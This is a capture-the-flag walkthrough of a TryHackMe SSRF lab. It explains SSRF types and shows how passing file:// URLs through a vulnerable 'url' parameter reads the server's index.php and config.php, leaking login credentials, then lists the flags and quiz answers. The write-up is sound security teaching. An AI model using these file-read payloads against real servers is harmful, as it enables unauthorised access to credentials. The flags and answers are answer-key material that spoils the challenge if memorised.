# Day_22 [SSRF] Jingle Your SSRF Bells: A Merry Command & Control Hackventure

+ Deployable Machine: Yes

Description: As the elves try to recover the compromised servers, McSkidy's SOC team identify abnormal activity and notice that a massive amount of data is being sent to an unknown server (already identified on Day 9). An insider has likely created a malicious backdoor. McSkidy has contacted Detective Frost-eau from law enforcement to help them. Can you assist Detective Frost-eau in taking down the command and control server?

> IP: [10.10.189.202]

## LEARNING OBJECTIVES

1. Understanding server-side request forgery (SSRF)
2. Which different types of SSRF are used to exploit the vulnerability
3. Prerequisites for exploiting the vulnerability
4. How the attack works
5. How to exploit the vulnerability
6. Mitigation measures for protection

## OVERVIEW

1. What is SSRF?
   1. SSRF, or server-side request forgery, is a security vulnerability that occurs when an attacker tricks a web application into making unauthorised requests to internal or external resources on the server's behalf.
2. Types of SSRF
   1. Basic: In a basic SSRF attack, the attacker sends a crafted request from the vulnerable server to internal or external resources. For example, they might attempt to access files on the local file system, internal services, or databases that are not intended to be publicly accessible.
   2. Blind SSRF: In a blind SSRF attack, the attacker doesn't directly see the response to the request. Instead, they may infer information about the internal network by measuring the time it takes for the server to respond or observing error message changes.
   3. Semi-blind SSRF: In semi-blind SSRF, again, the attacker does not receive direct responses in their browser or application. However, they rely on indirect clues, side-channel information, or observable effects within the application to determine the success or failure of their SSRF requests. This might involve monitoring changes in application behaviour, response times, error messages, and other signs.
3. How Does SSRD Work?
   1. Identifying vulnerable input: The attacker locates an input field within the application that can be manipulated to trigger server-side requestsImage for how SSRF works. This could be a URL parameter in a web form, an API endpoint, or request parameter input such as the referrer.
   2. Manipulating the input: The attacker inputs a malicious URL or other payloads that cause the application to make unintended requests. This input could be a URL pointing to an internal server, a loopback address, or an external server under the attacker's control.
   3. Requesting unauthorised resources: The application server, unaware of the malicious input, makes a request to the specified URL or resource. This request could target internal resources, sensitive services, or external systems.
   4. Exploiting the response: Depending on the application's behaviour and the attacker's payload, the response from the malicious request may provide valuable information, such as internal server data, credentials, system credentials/information, or pathways for further exploitation.

## STEPS

1. Deploy Machine
2. Add IP:[http://mcgreedysecretc2.thm] to /etc/hosts file
3. Go to website
   1. We are met with a login
   2. Lets look at the URL to see if we can exploit any endpoints
4. URL
   1. Request to [http://10.10.189.202/getClientData.php?url=http://IP_OF_CLIENT/NAME_OF_FILE_YOU_WANT_TO_ACCESS]
   2. Exploit Response
      1. Lets try and get the code of the index page
      2. [http://10.10.189.202/getClientData.php?url=file:////var/www/html/index.php]
         1. Now we see the index.php code

            ```php
               <?php
               session_start();
               include('config.php');
               // Check if the form was submitted
               if ($_SERVER["REQUEST_METHOD"] == "POST") {
               // Retrieve the submitted username and password
               //print_r($_SERVER);
               $uname = $_POST["username"];
               $pwd = $_POST["password"];

               // Check if both the username and password are "hello"
               if ($uname === $username && $pwd === $password) {
                  // If both are "hello," load the page (replace 'page.php' with the actual page URL)
                  $_SESSION['logged_in'] = true;
                  header("Location: dashboard.php");
                  exit();
               } else {
                  // If not, display an error message
                  $error_message = "Invalid password. Please try again.";
               }
               }
               ?>
            ```

            1. Now we can see how the login works lets check for the config.php file

5. EXPLOIT
   1. Lets try and get the config.php file
      1. Go to [http://10.10.189.202/getClientData.php?url=file:////var/www/html/config.php]

         ```php
            <?php
               $username = "mcgreedy";
               $password = "mcgreedy!@#$%";
            ?>
         ```

         1. Awesome now we have credentials lets try signing in
   2. SignIn
      1. UN: mcgreedy
      2. PW: mcgreedy!@#$%
         1. SUCCESS! We now see the doashboard and a flag
            1. FLAG: `Flag: THM{EXPLOITED_31001}`
   3. DASHBOARD
      1. Looking at the bottom of the dashboard we see the `Version 1.1`
      2. Remove the McSkiddy Action
         1. FLAG: `THM{AGENT_REMOVED_1001}`

## QUESTIONS

1. Is SSRF the process in which the attacker tricks the server into loading only external resources (yea/nay)?
   1. `Nay`
2. What is the C2 version?
   1. `1.1`
3. What is the username for accessing the C2 panel?
   1. `mcgreedy`
4. What is the flag value after accessing the C2 panel?
   1. `THM{EXPLOITED_31001}`
5. What is the flag value after stopping the data exfiltration from the McSkidy computer?
   1. `THM{AGENT_REMOVED_1001}`
